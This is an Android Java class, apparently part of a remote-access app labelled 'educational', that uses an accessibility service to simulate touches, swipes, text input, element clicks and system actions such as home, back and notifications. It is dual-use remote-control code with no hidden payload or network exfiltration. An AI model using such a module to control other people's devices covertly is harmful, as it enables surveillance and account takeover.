package com.remoteaccess.educational.commands;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.graphics.Point;
import android.os.Build;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.annotation.RequiresApi;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * SCREEN CONTROLLER - Remote Screen Control
 * 
 * ⚠️ EDUCATIONAL PURPOSE ONLY
 * - Requires Accessibility Service
 * - User must enable manually
 * - Visible in Android Settings
 * 
 * FEATURES:
 * - Touch simulation
 * - Swipe gestures
 * - Text input
 * - Button clicks
 * - Scroll actions
 */
@RequiresApi(api = Build.VERSION_CODES.N)
public class ScreenController {

    private AccessibilityService accessibilityService;
    private int screenWidth;
    private int screenHeight;

    public ScreenController(AccessibilityService service) {
        this.accessibilityService = service;
        
        // Get screen dimensions
        WindowManager wm = (WindowManager) service.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point size = new Point();
        display.getRealSize(size);
        this.screenWidth = size.x;
        this.screenHeight = size.y;
    }

    /**
     * Simulate touch at coordinates
     */
    public JSONObject touch(int x, int y, int duration) {
        JSONObject result = new JSONObject();
        
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                result.put("success", false);
                result.put("error", "Requires Android 7.0+");
                return result;
            }

            // Validate coordinates
            if (x < 0 || x > screenWidth || y < 0 || y > screenHeight) {
                result.put("success", false);
                result.put("error", "Invalid coordinates");
                return result;
            }

            // Create touch gesture
            Path path = new Path();
            path.moveTo(x, y);
            
            GestureDescription.StrokeDescription stroke = 
                new GestureDescription.StrokeDescription(path, 0, duration);
            
            GestureDescription gesture = new GestureDescription.Builder()
                .addStroke(stroke)
                .build();

            // Dispatch gesture
            boolean dispatched = accessibilityService.dispatchGesture(
                gesture, 
                new AccessibilityService.GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription gestureDescription) {
                        super.onCompleted(gestureDescription);
                    }

                    @Override
                    public void onCancelled(GestureDescription gestureDescription) {
                        super.onCancelled(gestureDescription);
                    }
                }, 
                null
            );

            result.put("success", dispatched);
            result.put("x", x);
            result.put("y", y);
            result.put("duration", duration);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Simulate swipe gesture
     */
    public JSONObject swipe(int startX, int startY, int endX, int endY, int duration) {
        JSONObject result = new JSONObject();
        
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                result.put("success", false);
                result.put("error", "Requires Android 7.0+");
                return result;
            }

            // Create swipe path
            Path path = new Path();
            path.moveTo(startX, startY);
            path.lineTo(endX, endY);
            
            GestureDescription.StrokeDescription stroke = 
                new GestureDescription.StrokeDescription(path, 0, duration);
            
            GestureDescription gesture = new GestureDescription.Builder()
                .addStroke(stroke)
                .build();

            // Dispatch gesture
            boolean dispatched = accessibilityService.dispatchGesture(gesture, null, null);

            result.put("success", dispatched);
            result.put("startX", startX);
            result.put("startY", startY);
            result.put("endX", endX);
            result.put("endY", endY);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Perform back button action
     */
    public JSONObject pressBack() {
        JSONObject result = new JSONObject();
        
        try {
            boolean success = accessibilityService.performGlobalAction(
                AccessibilityService.GLOBAL_ACTION_BACK
            );

            result.put("success", success);
            result.put("action", "back");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Perform home button action
     */
    public JSONObject pressHome() {
        JSONObject result = new JSONObject();
        
        try {
            boolean success = accessibilityService.performGlobalAction(
                AccessibilityService.GLOBAL_ACTION_HOME
            );

            result.put("success", success);
            result.put("action", "home");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Perform recent apps action
     */
    public JSONObject pressRecents() {
        JSONObject result = new JSONObject();
        
        try {
            boolean success = accessibilityService.performGlobalAction(
                AccessibilityService.GLOBAL_ACTION_RECENTS
            );

            result.put("success", success);
            result.put("action", "recents");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Open notifications
     */
    public JSONObject openNotifications() {
        JSONObject result = new JSONObject();
        
        try {
            boolean success = accessibilityService.performGlobalAction(
                AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS
            );

            result.put("success", success);
            result.put("action", "notifications");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Open quick settings
     */
    public JSONObject openQuickSettings() {
        JSONObject result = new JSONObject();
        
        try {
            boolean success = accessibilityService.performGlobalAction(
                AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS
            );

            result.put("success", success);
            result.put("action", "quick_settings");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Scroll up
     */
    public JSONObject scrollUp() {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            boolean success = rootNode.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD);
            rootNode.recycle();

            result.put("success", success);
            result.put("action", "scroll_up");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Scroll down
     */
    public JSONObject scrollDown() {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            boolean success = rootNode.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
            rootNode.recycle();

            result.put("success", success);
            result.put("action", "scroll_down");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Input text
     */
    public JSONObject inputText(String text) {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            // Find focused node
            AccessibilityNodeInfo focusedNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            
            if (focusedNode == null) {
                result.put("success", false);
                result.put("error", "No input field focused");
                rootNode.recycle();
                return result;
            }

            // Set text
            android.os.Bundle arguments = new android.os.Bundle();
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            boolean success = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);

            focusedNode.recycle();
            rootNode.recycle();

            result.put("success", success);
            result.put("text", text);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Click on element by text
     */
    public JSONObject clickByText(String text) {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            // Find node with text
            java.util.List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
            
            if (nodes.isEmpty()) {
                result.put("success", false);
                result.put("error", "Element not found");
                rootNode.recycle();
                return result;
            }

            // Click first matching node
            boolean success = nodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            
            for (AccessibilityNodeInfo node : nodes) {
                node.recycle();
            }
            rootNode.recycle();

            result.put("success", success);
            result.put("text", text);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get screen dimensions
     */
    public JSONObject getScreenInfo() {
        JSONObject result = new JSONObject();
        
        try {
            result.put("success", true);
            result.put("width", screenWidth);
            result.put("height", screenHeight);
            
        } catch (JSONException e) {
            e.printStackTrace();
        }
        
        return result;
    }
}
